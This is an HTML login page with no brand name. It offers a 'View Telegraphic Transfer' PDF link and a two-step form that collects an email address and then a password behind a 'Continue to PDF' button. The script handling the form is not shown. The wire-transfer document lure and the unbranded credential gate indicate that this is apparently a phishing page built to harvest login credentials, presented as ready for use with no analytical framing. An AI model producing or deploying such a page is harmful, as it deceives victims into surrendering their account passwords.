<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="background"></div>

    <div class="login-container">
        <h1 id="pageTitle">Login</h1>
        
        <div class="language-selector">
            <button class="lang-btn active" data-lang="en">English</button>
            <button class="lang-btn" data-lang="es">Español</button>
            <button class="lang-btn" data-lang="fr">Français</button>
            <button class="lang-btn" data-lang="zh">中文</button>
        </div>
        
        <div class="success-message" id="successMessage">
            <span id="successText">Login successful! Redirecting...</span>
        </div>

        <!-- Step 1: Email Entry -->
        <form id="emailForm" class="form-step active">
            <div class="form-group">
                <label for="email" id="emailLabel">Email Address</label>
                <input type="email" id="email" name="email" autocomplete="email" required>
                <div class="error-message" id="emailError"></div>
            </div>

            <button type="submit" id="continueBtn">Continue</button>

            <div class="pdf-section">
                <span id="viewPdfText">View Telegraphic Transfer</span>
                <a href="#" id="viewPdfLink" class="pdf-link">View PDF</a>
            </div>
        </form>

        <!-- Step 2: Password Entry -->
        <form id="passwordForm" class="form-step">
            <div class="email-display" id="emailDisplay">
                <span id="displayedEmail"></span>
                <a href="#" id="changeEmailLink" class="change-link">Change</a>
            </div>

            <div class="form-group">
                <label for="password" id="passwordLabel">Password</label>
                <input type="password" id="password" name="password" autocomplete="current-password" required>
                <div class="error-message" id="passwordError"></div>
            </div>

            <div class="checkbox-group">
                <input type="checkbox" id="remember" name="remember">
                <label for="remember" id="rememberLabel">Remember me</label>
            </div>

            <button type="submit" id="submitBtn">Continue to PDF</button>
        </form>
    </div>

    <script src="js/translations.js"></script>
    <script src="js/main.js"></script>
</body>
</html>
